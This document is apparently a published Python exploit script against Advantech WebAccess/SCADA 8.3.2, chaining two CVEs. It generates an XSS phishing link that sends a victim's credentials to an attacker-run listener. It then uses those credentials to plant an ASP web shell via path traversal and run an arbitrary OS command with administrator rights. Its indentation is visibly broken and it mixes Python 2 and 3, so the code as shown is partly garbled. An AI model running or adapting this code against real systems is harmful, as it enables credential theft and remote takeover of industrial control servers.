# Exploit Author: Chris Lyne (@lynerc)
# Vendor Homepage: http://www.advantech.com
# Device: NRVMini2
# Software Link: http://downloadt.advantech.com/download/downloadsr.aspx?File_Id=1-1MDG1BH
# Version: 8.3.2
# Tested on: Windows Server 2008 R2
# CVE: CVE-2018-15705, CVE-2018-15707
# TRA: https://www.tenable.com/security/research/tra-2018-35
# Description:
#
# This code exploits two vulnerabilities to gain remote code execution
# with Administrator privileges:
#
# 1) CVE-2018-15707 to steal credentials (XSS). User-interaction required.
# 2) CVE-2018-15705 to write an ASP file to the server.
 
from http.server import HTTPServer, BaseHTTPRequestHandler
from base64 import decodestring
import re
import requests, urllib, json
import sys
import argparse
 
TIMEOUT = 5 # sec
 
def err_and_exit(msg):
    print &#039;\n\nERROR: &#039; + msg + &#039;\n\n&#039;
    sys.exit(1)
 
# WADashboard client
class WsClient:
    def __init__(self, ip, port, https=False):
        self.ip = ip
        self.port = port
        self.https = https
 
        self.endpoint = &#039;https&#039; if https else &#039;http&#039;
        self.endpoint += &#039;://&#039; + ip + &#039;:&#039; + str(port)
        self.endpoint += &#039;/WADashboard&#039;
 
    # see if service is up
    def grab_projects(self):
        url = self.endpoint + &#039;/api/dashboard/v6/waConfig/getWebAccessProjectList&#039;
        r = requests.get(url, timeout=TIMEOUT)
        if "resString" in r.text:
            json_decoded = json.loads(r.text)
            if json_decoded[&#039;resString&#039;] is not None and len(json_decoded[&#039;resString&#039;]) > 0:
                return json_decoded[&#039;resString&#039;]
        return None
 
    # success if we get cookies
    def login(self, projectName, user, pw):
        # issue a login request and set the cookies
        # POST /WADashboard/login?cont=dashboardViewer
        # projectName1=myproject&username=admin&password=hello&recId=
        url = self.endpoint + &#039;/login?cont=dashboardViewer&#039;
        data = {
            &#039;projectName1&#039;  : projectName,
            &#039;username&#039;      : user,
            &#039;password&#039;      : pw,
            &#039;recId&#039;         : &#039;&#039;
        }
        r = requests.post(url, data, timeout=TIMEOUT)
        if len(r.cookies) > 0:
            self.cookies = r.cookies
            return True     # success
        else:
            return False    # fail
         
    def write_file(self, filename, contents):
        # /WADashboard/api/dashboard/v1/files/writeFile?projectSpecies=myproject!savedConfiguration&folderpath=../../../../exec.asp&msg=contents&overwrite=true
 
        # post the writeFile request
        # for some reason, the data is required in the query string instead of POST data
        url = self.endpoint + &#039;/api/dashboard/v1/files/writeFile&#039;
        data = {
            &#039;projectSpecies&#039;    : victim[&#039;project&#039;] + &#039;!savedConfiguration&#039;,
            &#039;folderpath&#039;        : &#039;../../../../&#039; + filename,    # uploads to /Broadweb/ folder
            &#039;msg&#039;               : contents,
            &#039;overwrite&#039;         : &#039;true&#039;
        }
 
        url += &#039;?&#039; + urllib.urlencode(data)
        r = requests.post(url, cookies=self.cookies, timeout=TIMEOUT)
        return (r.status_code == 200)
 
# This class will serve as an HTTP listener
class MyWebHandler(BaseHTTPRequestHandler):
    def do_GET(self):
 
        data = self.path.replace(&#039;/&#039;, &#039;&#039;) # remove leading slash
        decoded = decodestring(data)
 
        print "\n***LINK CLICKED!***"
 
    try:
        # carve out the piece we want to match
        i = decoded.index(&#039;logOnWebService&#039;)
        k = decoded.index(&#039;readNodeStatus&#039;)
        chunk = decoded[i:k]
 
        # find our match
        regex = &#039;^logOnWebService\\("(.+)", "(.*)"\\);.*&#039;
        m = re.match(regex, chunk)
 
            if not m:
                err_and_exit("Couldn&#039;t extract credentials...")
 
            print "\nCredentials stolen..."
            user = m.group(1)
            pw = m.group(2)
            print "- User: " + user
            print "- Pass: " + pw
 
        # login to WADashboard
        if not client.login(victim[&#039;project&#039;], user, pw):
        err_and_exit("Credentials didn&#039;t work...")
 
        print &#039;\nLogged into WADashboard with credentials.&#039;
 
            # write malicious ASP file
            asp_payload = &#039;<% Set t=Server.CreateObject("webdobj.webdraw"):t.RemoteWinExec Request.QueryString("p"),Request.QueryString("n"),Request.QueryString("c"):Response.Write "Done."%>&#039;
            filename = &#039;exec.asp&#039;
            if not client.write_file(filename, asp_payload):
                err_and_exit("Write file failed...")
 
            print "\n&#039;" + filename + "&#039; written to disk."
 
            # execute OS command
            url = broadweb_root + &#039;/&#039; + filename
            data = {
                &#039;p&#039; : victim[&#039;project&#039;],
                &#039;n&#039; : victim[&#039;node&#039;],
                &#039;c&#039; : victim[&#039;cmd&#039;]
            }
 
            url += &#039;?&#039; + urllib.urlencode(data)
            r = requests.get(url, timeout=TIMEOUT)   # no cookie needed
            if r.status_code == 200:
                print "\nSuccessful request to &#039;" + url + "&#039;\n"
            else:
                print "\nThere may be something wrong with the ASP payload.\n"
 
            print "\nDone!"
    except Exception as e:
            print "Exception encountered: " + str(e)
 
        msg = &#039;hello poppet&#039;
 
        self.send_response(200)
        self.end_headers()
        self.wfile.write(str.encode(msg))
 
# MAIN
 
# deal with command line flags
desc = &#039;&#039;&#039;This exploit targets Advantech WebAccess/SCADA 8.3.2. It has been tested against Windows 2008 R2 x64.
 
The goal of the script is to execute code remotely. User interaction is required.
 
The following operations will be conducted:
1) Ensure WebAccess application is running. (TCP port 80 by default)
2) Ensure WADashboard is running. (TCP port 8081 by default)
3) Ensure user-specified project exists.
4) Ensure user-specified node exists.
5) Generate malicious link to send to victim user. (exploits CVE-2018-15707 to steal credentials via XSS)
6) Start HTTP listener to receive credentials when victim clicks the link.
7) Login to WADashboard.
8) Write a malicious ASP file to the root of the WebAccess application. (exploits CVE-2018-15705)
Note: elevated privileges will be obtained using the Webdraw RemoteWinExec function.
9) Execute user-specified command.
 
Example (equivalent) commands:
python script.py -t 192.168.0.2 -p1 80 -p2 8081 -https false -proj myproject -node mynode -ip 192.168.0.3 -port 9999 -cmd calc.exe
python script.py -t 192.168.0.2 -proj myproject -node mynode -ip 192.168.0.3 -cmd calc.exe
&#039;&#039;&#039;
 
arg_parser = argparse.ArgumentParser(description=desc)
arg_parser.add_argument(&#039;-t&#039;, required=True, help=&#039;Target IP (Required)&#039;)
arg_parser.add_argument(&#039;-p1&#039;, type=int, default=80, help=&#039;WebAccess Port (Default: 80)&#039;)
arg_parser.add_argument(&#039;-p2&#039;, type=int, default=8081, help=&#039;WADashboard Port (Default: 8081)&#039;)
arg_parser.add_argument(&#039;-https&#039;, type=bool, default=False, help=&#039;HTTPS (Default: false)&#039;)
arg_parser.add_argument(&#039;-proj&#039;, required=True, help=&#039;Project name&#039;)
arg_parser.add_argument(&#039;-node&#039;, required=True, help=&#039;Node name&#039;)
arg_parser.add_argument(&#039;-ip&#039;, required=True, help=&#039;HTTP listener IP&#039;)
arg_parser.add_argument(&#039;-port&#039;, type=int, default=9999, help=&#039;HTTP listener port (Default: 9999)&#039;)
arg_parser.add_argument(&#039;-cmd&#039;, required=True, help=&#039;OS command to be executed&#039;)
 
args = arg_parser.parse_args()
 
# victim settings
victim = dict()
victim[&#039;ip&#039;] = args.t
victim[&#039;web_port&#039;] = args.p1         # Broadweb web app port
victim[&#039;ws_port&#039;] = args.p2        # WADashboard Node.js service port
victim[&#039;https&#039;] = args.https
victim[&#039;project&#039;] = args.proj
victim[&#039;node&#039;] = args.node
victim[&#039;cmd&#039;] = args.cmd
 
# listener settings
listener = dict()
listener[&#039;ip&#039;] = args.ip
listener[&#039;port&#039;] = args.port
 
# validate IP addresses
ip_pattern = "[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+"
for ip in [victim[&#039;ip&#039;], listener[&#039;ip&#039;]]:
    match = re.match(ip_pattern, ip) 
    if match is None:
    print "\nError: IP Address is invalid: &#039;" + ip + "&#039;.\n"
    arg_parser.print_help()
    sys.exit(1)
 
# start the real work
# ensure WebAccess ASP application is running
print "\nPerforming some banner checks to ensure services are running...\n"
proto = &#039;https&#039; if victim[&#039;https&#039;] else &#039;http&#039;
broadweb_root = proto + &#039;://&#039; + victim[&#039;ip&#039;]
# no need to add port if it&#039;s 80 or 443
https = victim[&#039;https&#039;]
if (https and victim[&#039;web_port&#039;] != 443) or (victim[&#039;web_port&#039;] != 80 and not https):
    broadweb_root += &#039;:&#039; + str(victim[&#039;web_port&#039;])
broadweb_root += &#039;/broadWeb&#039;
url = broadweb_root + &#039;/bwRoot.asp&#039;
 
try:
    r = requests.get(url, timeout=TIMEOUT)
except requests.exceptions.ConnectionError as e:
    err_and_exit(&#039;Cannot reach host &#039; + victim[&#039;ip&#039;] + &#039; on port &#039; + str(victim[&#039;web_port&#039;]))
 
if &#039;Welcome to Advantech WebAccess&#039; not in r.text:
    err_and_exit(&#039;WebAccess not found.&#039;)
 
print &#039;WebAccess is up.&#039;
 
# ensure WADashboard Node.js service is running
# and projects are defined
client = WsClient(victim[&#039;ip&#039;], victim[&#039;ws_port&#039;], https=https)
 
try:
    projects = client.grab_projects()
except requests.exceptions.ConnectionError as e:
    err_and_exit(&#039;Cannot reach host &#039; + victim[&#039;ip&#039;] + &#039; on port &#039; + str(victim[&#039;ws_port&#039;]))
 
if not projects:
    err_and_exit(&#039;Dashboard Viewer not found.&#039;)
 
print "Dashboard Viewer is up."
 
if len(projects) == 0:
    err_and_exit("No projects found...")
 
print "\nFound projects: "
for project in projects:
    print " - " + project
 
# ensure specified project exists
if victim[&#039;project&#039;] not in projects:
    err_and_exit("Specified project, " + victim[&#039;project&#039;] + " was not found...")
 
print "Specified project &#039;" + victim[&#039;project&#039;] + "&#039; exists."
 
# ensure nodes are defined for project
# we have to specify a node name to run the custom RemoteWinExec() function
url = broadweb_root + &#039;/&#039; + victim[&#039;project&#039;]  +&#039;.dpj&#039;
r = requests.get(url, timeout=TIMEOUT)
node_list = list()
if "[nodelist]" in r.text:
    for line in r.text.split(&#039;\n&#039;):
        regex = "^node[0-9]=(.*)$"
        m = re.match(regex, line, flags=re.MULTILINE)
        if m:
            node_list.append(m.group(1).strip())
 
if len(node_list) == 0:
    err_and_exit("No nodes found...")
 
print "\nFound nodes: "
for node in node_list:
    print &#039; - &#039; + node
 
if victim[&#039;node&#039;] not in node_list:
    err_and_exit("Node, " + victim[&#039;node&#039;] + " not in node list...")
 
print "Specified node &#039;" + victim[&#039;node&#039;] + "&#039; exists."
 
# generate link to send to victim
print "\nSend this link to the victim:"
print "Keep in mind, they could be logged in via localhost."
link = broadweb_root + &#039;/bwmainleft.asp?pid=1&pname=");i=document.createElement(\&#039;img\&#039;);&#039;
link += &#039;i.src="http://&#039; + listener[&#039;ip&#039;] + &#039;:&#039; + str(listener[&#039;port&#039;]) + &#039;/&#039;
link += &#039;"%2bbtoa(document.getElementsByTagName(\&#039;script\&#039;)[4].text);//&#039;
 
print link
 
# start listener
print "\nListening on " + listener[&#039;ip&#039;] + ":" + str(listener[&#039;port&#039;])
print "Waiting for victim to click link..."
httpd = HTTPServer((listener[&#039;ip&#039;], listener[&#039;port&#039;]), MyWebHandler)
httpd.handle_request()

